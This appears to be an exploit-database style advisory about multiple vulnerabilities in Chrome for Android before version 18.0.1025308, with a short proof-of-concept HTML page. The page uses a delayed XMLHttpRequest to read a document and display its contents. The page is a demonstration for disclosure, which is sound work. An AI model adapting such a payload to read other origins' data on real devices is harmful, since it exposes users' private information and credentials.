source: https://www.securityfocus.com/bid/55523/info
   
Google Chrome for Android is prone to multiple vulnerabilities.
   
Attackers may exploit these issues to execute arbitrary code in the context of the browser, obtain potentially sensitive information, bypass the same-origin policy, and steal cookie-based authentication credentials; other attacks are also possible.
   
Versions prior to Chrome for Android 18.0.1025308 are vulnerable. 

<body>
     <u>Wait a few seconds.</u>
     <script>
     function doitjs() {
       var xhr = new XMLHttpRequest;
       xhr.onload = function() {
         alert(xhr.responseText);
       };
       xhr.open('GET', document.URL);
       xhr.send(null);
     }
     setTimeout(doitjs, 8000);
     </script>
</body>